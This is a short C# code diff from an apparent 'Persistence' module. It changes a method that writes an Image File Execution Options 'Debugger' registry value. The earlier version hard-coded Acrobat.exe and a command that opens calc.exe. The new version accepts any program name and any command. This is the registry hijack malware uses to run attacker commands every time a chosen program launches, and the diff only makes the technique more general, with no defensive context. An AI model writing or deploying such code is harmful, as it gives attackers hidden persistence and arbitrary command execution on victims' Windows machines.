@@ -35,14 +35,12 @@ namespace Persistence
         /// <summary>
         /// 
         /// </summary>
-        public void ReplaceProgram()
+        public void ReplaceProgram(string programName, string commandToExecute)
         {
-            // Maybe I should do copy of program and execute it with my program using &
-
-            var subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Acrobat.exe",
-                                          true);
+            var subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{programName}",
+                              true);
             ArgumentNullException.ThrowIfNull(subkey);
-            subkey.SetValue("Debugger", "cmd /C calc.exe", RegistryValueKind.String);
+            subkey.SetValue("Debugger", $"cmd /C {commandToExecute}", RegistryValueKind.String);
 
             // subkey.DeleteValue("Debugger");
         }
